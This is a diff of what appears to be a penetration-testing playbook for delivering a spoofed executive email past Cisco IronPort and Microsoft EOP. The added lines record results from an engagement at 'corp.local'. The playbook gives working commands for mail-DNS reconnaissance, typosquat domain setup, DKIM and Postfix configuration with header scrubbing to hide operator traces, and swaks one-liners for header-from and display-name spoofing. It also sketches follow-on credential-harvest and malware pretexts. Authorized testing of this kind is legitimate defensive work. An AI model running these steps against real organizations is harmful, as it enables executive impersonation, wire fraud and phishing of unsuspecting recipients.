@@ -8,53 +8,52 @@
 ---
 
 ## Objective
-Deliver a spoofed email impersonating a target organization executive into a recipient's inbox, bypassing enterprise email security controls (IronPort, Microsoft EOP, Anti_Spoof filters).
+Deliver a spoofed email impersonating a target organization executive into a recipient's inbox, bypassing enterprise email security controls (Cisco IronPort, Microsoft EOP, Anti_Spoof content filters).
 
 ---
 
 ## Prerequisites
-- A domain registrar account (Cloudflare Registrar / Namecheap)
-- Kali Linux (VM or bare metal) with internet access on port 25
+- Domain registrar account (Cloudflare Registrar)
+- Kali Linux VM with internet access on port 25
 - Postfix + OpenDKIM + swaks installed
-- Written authorization / scope document for the engagement
-- Target domain OSINT completed (identify executive names, email format)
+- Written authorization / SOW for the engagement
+- Executive names and email format from OSINT (e.g., LinkedIn, email signature leaks)
 
 ---
 
 ## Step 1 — Recon: Assess Target Email Security Posture
-
-*Technique: [[ttps/recon/email-security-dns-recon]] (T1596.005)*
+*[[ttps/recon/email-security-dns-recon]] (T1596.005)*
 
 ```bash
 DOMAIN="targetdomain.com"
-echo "=== MX ===" && dig +short MX $DOMAIN
-echo "=== SPF ===" && dig +short TXT $DOMAIN | grep -i spf
-echo "=== DMARC ===" && dig +short TXT _dmarc.$DOMAIN
-echo "=== DKIM ===" && for sel in default google selector1 selector2 k1 mail; do
+dig +short MX $DOMAIN
+dig +short TXT $DOMAIN | grep -i spf
+dig +short TXT _dmarc.$DOMAIN
+for sel in default google selector1 selector2 k1 mail; do
   result=$(dig +short TXT ${sel}._domainkey.$DOMAIN 2>/dev/null)
-  [ -n "$result" ] && echo "  [$sel]: $result"
+  [ -n "$result" ] && echo "[$sel]: $result"
 done
 ```
 
-**Decision gate:**
+**corp.local result (2026-03-08):**
+- MX: Cisco IronPort (iphmx.com) — Talos SenderBase reputation, custom Anti_Spoof filters
+- SPF: `-all` hardfail; includes `spf.protection.outlook.com` → M365 internal delivery confirmed
+- DMARC: `p=none` → no enforcement; Proofpoint receiving reports
+- DKIM: no selectors found
 
-| Finding | Path |
-|---|---|
-| DMARC `p=reject` | Display name spoof only |
-| DMARC `p=none` | Attempt header-from spoof; fall back to display name |
-| MX is `*.iphmx.com` (IronPort) + `include:spf.protection.outlook.com` in SPF | Two-layer stack: IronPort gateway + M365 EOP internally |
-| MX is `*.pphosted.com` or `*.mimecast.com` | Stricter — display name spoof only, VPS sending IP recommended |
+**Decision:** `p=none` opens header-from spoof. M365 internally means domain selection critical. Attempt Approach 2 first; fall back to Approach 1.
 
 ---
 
-## Step 2 — Check Port 25 Reachability to Target MX
+## Step 2 — Check Port 25 Reachability
 
 ```bash
 MX=$(dig +short MX $DOMAIN | sort -n | head -1 | awk '{print $2}')
 nc -zv $MX 25 2>&1
+(echo "EHLO test"; sleep 2; echo "QUIT") | nc -w 10 $MX 25
 ```
 
-If port 25 is blocked from your sending IP → switch to non-AWS VPS or home lab.
+**corp.local result:** Port 25 open. IronPort returned 220 banner and 250 EHLO response. Port 587 and 465 refused — IronPort accepts inbound on 25 only.
 
 ---
 
@@ -63,27 +62,30 @@ If port 25 is blocked from your sending IP → switch to non-AWS VPS or home lab
 ```bash
 IP=$(curl -s https://api.ipify.org)
 REV=$(echo $IP | awk -F. '{print $4"."$3"."$2"."$1}')
-echo -n "Spamhaus: "; dig +short $REV.zen.spamhaus.org
-echo -n "PTR: "; dig +short -x $IP
+dig +short $REV.zen.spamhaus.org   # 127.0.0.4 = PBL, 127.0.0.3 = SBL
+dig +short -x $IP
 ```
 
-> If using a VPN: test with VPN on AND off. Some VPN exit nodes are blocked by Talos/IronPort even if clean on Spamhaus. Residential IPs often pass Talos but fail Gmail.
+**corp.local engagement:**
+- Home IP `165.162.30.26` (Spectrum residential): on Spamhaus PBL/SBL/CSS but **neutral in Talos** — IronPort let it through
+- ProtonVPN IP `159.26.99.31`: clean on Spamhaus but **blocked by Talos** — IronPort dropped connection
+- Lesson: Spamhaus ≠ Talos. IronPort uses Talos. Test both.
 
 ---
 
 ## Step 4 — Register Typosquat Domain
+*[[ttps/resource-development/typosquat-domain-acquisition]] (T1583.001)*
 
-*Technique: [[ttps/resource-development/typosquat-domain-acquisition]] (T1583.001)*
+**Critical for M365 targets:** Avoid Microsoft product strings in domain name.
 
-Choose a domain visually similar to the target. **Critical:** Avoid Microsoft product strings (`m365`, `outlook`, `azure`) if target runs M365 — EOP brand protection will quarantine regardless of authentication scores.
-
-Good pattern: `[target]-portal.com` or single character substitution.
+**corp.local engagement:**
+- First attempt: `m365-verify.com` → EOP brand protection quarantined regardless of 8.9/10 auth score
+- Solution: `target-portal.com` (one char off from `corp.local`) → bypassed all filters
 
 ---
 
 ## Step 5 — Generate DKIM Keypair
-
-*Technique: [[ttps/resource-development/dkim-infrastructure-setup]] (T1587.003)*
+*[[ttps/resource-development/dkim-infrastructure-setup]] (T1587.003)*
 
 ```bash
 mkdir -p ~/dkim && cd ~/dkim
@@ -96,109 +98,60 @@ grep -v "^-----" dkim-public.key | tr -d '\n'   # → paste into DNS
 
 ## Step 6 — Configure DNS (Cloudflare)
 
-Add all records to the typosquat domain. Wait 60 seconds, verify propagation:
-
-```bash
-D="your-typosquat.com"
-dig @8.8.8.8 +short TXT $D              # SPF
-dig @1.1.1.1 +short TXT mail._domainkey.$D   # DKIM
-dig +short A mail.$D                    # A record
-dig +short MX $D                        # MX
+```
+TXT  @                  "v=spf1 ip4:<IP> -all"
+TXT  mail._domainkey    "v=DKIM1; k=rsa; p=<pubkey>"
+TXT  mail               "v=spf1 ip4:<IP> -all"
+A    mail               <IP>
+MX   @    10            mail.<domain>
 ```
 
-All four must resolve before proceeding.
+All records: proxy = DNS only (grey cloud). Verify all 5 records on 3 resolvers before proceeding.
 
 ---
 
 ## Step 7 — Stand Up Postfix + OpenDKIM
+*[[ttps/resource-development/dkim-infrastructure-setup]] + [[ttps/defense-evasion/smtp-header-scrubbing]]*
 
-*Technique: [[ttps/resource-development/dkim-infrastructure-setup]] + [[ttps/defense-evasion/smtp-header-scrubbing]]*
+See full install/config in [[ttps/resource-development/dkim-infrastructure-setup]].
 
-```bash
-sudo apt install postfix opendkim opendkim-tools swaks -y
-
-# OpenDKIM — key setup + config
-sudo mkdir -p /etc/opendkim/keys/your-typosquat.com
-sudo cp ~/dkim/dkim-private.key /etc/opendkim/keys/your-typosquat.com/mail.private
-sudo chown -R opendkim:opendkim /etc/opendkim
-sudo chmod 600 /etc/opendkim/keys/your-typosquat.com/mail.private
-
-sudo tee /etc/opendkim.conf > /dev/null << 'EOF'
-Mode                sv
-Selector            mail
-Socket              inet:12301@localhost
-RequireSafeKeys     no
-Canonicalization    relaxed/simple
-SigningTable        refile:/etc/opendkim/signing.table
-KeyTable            /etc/opendkim/key.table
-EOF
-
-echo "*    your-typosquat.com" | sudo tee /etc/opendkim/signing.table
-echo "your-typosquat.com    your-typosquat.com:mail:/etc/opendkim/keys/your-typosquat.com/mail.private" | sudo tee /etc/opendkim/key.table
-
-# Systemd fix (Kali/Debian)
-sudo mkdir -p /run/opendkim && sudo chown opendkim:opendkim /run/opendkim
-sudo mkdir -p /etc/systemd/system/opendkim.service.d
-sudo tee /etc/systemd/system/opendkim.service.d/override.conf > /dev/null << 'EOF'
-[Service]
-Type=simple
-PIDFile=
-ExecStart=
-ExecStart=/usr/sbin/opendkim -f -x /etc/opendkim.conf
-EOF
-sudo systemctl daemon-reload
-sudo rm -f /run/opendkim/opendkim.sock
-sudo systemctl start opendkim
-
-# Postfix — hostname + milter + header scrubbing
-sudo postconf -e "myhostname = mail.your-typosquat.com"
-sudo postconf -e "mydomain = your-typosquat.com"
-sudo postconf -e "smtp_helo_name = mail.your-typosquat.com"
-sudo postconf -e "smtpd_milters = inet:localhost:12301"
-sudo postconf -e "non_smtpd_milters = inet:localhost:12301"
-sudo postconf -e "milter_protocol = 6"
-sudo postconf -e "milter_default_action = accept"
-sudo postconf -e "header_checks = regexp:/etc/postfix/header_checks"
-
-sudo tee /etc/postfix/header_checks > /dev/null << 'EOF'
-/^Received: from.*localhost/    IGNORE
-/^X-Mailer:/                    IGNORE
-/^Message-Id:.*localdomain/     IGNORE
-EOF
-
-sudo systemctl restart postfix
-```
+Key gotchas from corp.local engagement:
+- Use `inet:localhost:12301` for milter — NOT `unix:` (Postfix chroot)
+- Systemd override with `-f` flag required on Kali
+- Wildcard signing table: `*    yourdomain.com` signs everything regardless of From domain
+- Do not run `postmap` on header_checks
 
 ---
 
-## Step 8 — Verify Stack (Test Send)
+## Step 8 — Verify Stack
 
-Send to mail-tester.com or a mailbox you control (not Gmail — residential IP will hard-bounce):
+Send to mail-tester.com (NOT Gmail — residential IP hard-rejected by Google):
 
 ```bash
-swaks -4 \
-  --to <mail-tester-address or your own mailbox> \
-  --from support@your-typosquat.com \
+swaks -4 --to <mail-tester-address> --from support@your-domain.com \
   --server localhost --port 25 \
-  --header "From: Test <support@your-typosquat.com>" \
-  --header "Subject: Stack Verification" \
-  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@your-typosquat.com>" \
+  --header "From: Test <support@your-domain.com>" \
+  --header "Subject: Stack Test" \
+  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@your-domain.com>" \
   --header "Date: $(date -R)" \
-  --body "DKIM verification test"
+  --body "DKIM stack verification"
 ```
 
-**Must confirm before proceeding:**
-- [ ] `SPF: PASS`
-- [ ] `DKIM: PASS` + `DKIM-Signature:` header present
-- [ ] No `kali`, `localhost`, or `localdomain` in headers
-- [ ] HELO shows `mail.your-typosquat.com`
-- [ ] No `X-Mailer: swaks`
+**corp.local result:** 8.9/10 on mail-tester after adding HELO SPF record and MX record. Remaining deduction: residential PTR (unfixable without VPS).
+
+Must confirm before proceeding:
+- [ ] SPF: PASS
+- [ ] DKIM: PASS + DKIM-Signature header present
+- [ ] No kali/localhost/localdomain in headers
+- [ ] HELO = mail.yourdomain.com
+- [ ] No X-Mailer: swaks
 
 ---
 
-## Step 9 — Attempt Header-From Spoof (If DMARC p=none)
+## Step 9 — Attempt Header-From Spoof (Approach 2)
+*[[ttps/initial-access/email-display-name-spoofing]] (T1566 / T1036.005 / T1656)*
 
-*Technique: [[ttps/initial-access/email-display-name-spoofing]] — Approach 2*
+Only if DMARC is `p=none`:
 
 ```bash
 swaks -4 \
@@ -207,70 +160,93 @@ swaks -4 \
   --server localhost --port 25 \
   --header "From: Executive Name <executive@victim.com>" \
   --header "Reply-To: executive@victim.com" \
-  --header "Subject: Quick approval needed" \
+  --header "Subject: Quick question" \
   --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@your-typosquat.com>" \
   --header "Date: $(date -R)" \
   --body "Body text"
 ```
 
-**If quarantined:** Proceed to Step 10. Document the quarantine — it's a valid finding (defense working).  
-**If delivered:** Capture headers + screenshot. Finding: DMARC `p=none` policy allows header-from spoofing.
+**corp.local result:** Quarantined by IronPort's custom Anti_Spoof content filter (detected envelope/From mismatch). Document the quarantine alert — it's a finding (partial defense exists). Proceed to Step 10.
 
 ---
 
-## Step 10 — Display Name Spoof
-
-*Technique: [[ttps/initial-access/email-display-name-spoofing]] — Approach 1*
+## Step 10 — Display Name Spoof (Approach 1)
+*[[ttps/initial-access/email-display-name-spoofing]] (T1036.005 / T1656)*
 
 ```bash
 swaks -4 \
   --to target@victim.com \
   --from executive@your-typosquat.com \
   --server localhost --port 25 \
-  --header "From: Executive Name, Title <executive@your-typosquat.com>" \
-  --header "Reply-To: executive@your-typosquat.com" \
-  --header "Subject: Quick approval needed" \
-  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@your-typosquat.com>" \
+  --header "From: CEO Name <executive@target-portal.com>" \
+  --header "Reply-To: executive@target-portal.com" \
+  --header "Subject: Quick question" \
+  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@target-portal.com>" \
   --header "Date: $(date -R)" \
   --body "Body text"
 ```
 
-No domain mismatch — passes Anti_Spoof filters. Victim sees only the display name on mobile and most desktop clients.
+**corp.local result:** ✅ Delivered to inbox. Bypassed IronPort Anti_Spoof and M365 EOP. No domain mismatch = no filter trigger.
 
 ---
 
-## Expected Results & Report Findings
+## Full One-Liner (Approach 1 — Display Name)
+```bash
+swaks -4 --to TARGET --from EXEC@TYPOSQUAT --server localhost --port 25 \
+  --header "From: EXEC NAME, TITLE <EXEC@TYPOSQUAT>" \
+  --header "Reply-To: EXEC@TYPOSQUAT" \
+  --header "Subject: SUBJECT" \
+  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@TYPOSQUAT>" \
+  --header "Date: $(date -R)" \
+  --body "BODY"
+```
 
-| Test | Expected Outcome | Finding |
-|---|---|---|
-| Header-From spoof | Quarantined by Anti_Spoof filter | ✅ Detection working — but DMARC `p=none` means no hard block |
-| Display name spoof | Delivered to inbox | ❌ Gap — domain spoofing controls don't cover display name impersonation |
-| Both combined | Shows detection + bypass side by side | Strong finding — demonstrates partial controls with exploitable gap |
+---
+
+## Expected Output
+
+**corp.local engagement findings:**
+- Approach 2 (header-from): IronPort Anti_Spoof quarantine alert generated ← finding: detection exists
+- Approach 1 (display name): Landed in inbox ← finding: detection gap, impersonation successful
+- Both together: demonstrates partial controls with exploitable bypass
 
 ---
 
 ## Evidence to Capture
-- [ ] Header-From spoof quarantine alert (screenshot — shows IronPort/EOP detecting the attempt)
-- [ ] Display name spoof inbox delivery (screenshot — shows bypass)
-- [ ] Raw headers of delivered mail (shows SPF/DKIM pass, clean headers)
-- [ ] `From:` display in mobile client (shows only "Executive Name" — no address)
+- [ ] Screenshot: IronPort/EOP Anti_Spoof quarantine alert (Approach 2) — shows detection
+- [ ] Screenshot: Display name spoof in inbox (Approach 1) — shows bypass
+- [ ] Screenshot: From field on mobile client showing only "CEO Name" — shows victim UX
+- [ ] Raw headers of delivered mail — SPF/DKIM pass, clean headers, no operator fingerprint
 
 ---
 
-## Cleanup
-1. Remove DNS records from typosquat domain in Cloudflare
-2. `sudo systemctl stop opendkim postfix`
-3. `sudo rm -rf /etc/opendkim/keys/ ~/dkim/`
-4. Document engagement artifacts and destroy if VPS used
+## Severity Assessment
+
+| Condition | Severity |
+|-----------|----------|
+| Header-from spoof delivers to inbox | Critical — DMARC p=none + no Anti_Spoof |
+| Header-from quarantined, display name delivers | High — partial controls, bypassed via display name |
+| Both blocked | Medium — controls working; social engineering still viable via lookalike domain |
 
 ---
 
-## Remediation for Report
+## Relay / Attack Path
+```
+Display name spoof delivered to inbox
+  → Pretext: wire transfer, credential reset, invoice approval, VPN token
+  → Link: credential harvest page
+  → Attachment: malware delivery
+  → Reply: attacker receives response at Reply-To address
+```
 
-| Finding | Recommendation |
-|---|---|
-| DMARC `p=none` | Escalate to `p=quarantine` then `p=reject` after monitoring period |
-| Display name spoof delivered | Enable strict anti-impersonation in EOP/IronPort — block external mail using internal display names |
+---
+
+## Remediation
+
+| Finding | Fix |
+|---------|-----|
+| DMARC `p=none` | Escalate to `p=quarantine` → `p=reject` after monitoring |
+| Display name spoof delivered | Enable anti-impersonation in EOP: block external mail with internal display names |
 | DKIM not configured | Implement DKIM signing on all outbound mail |
 | No user awareness | Train users to verify sender address, not just display name |
 
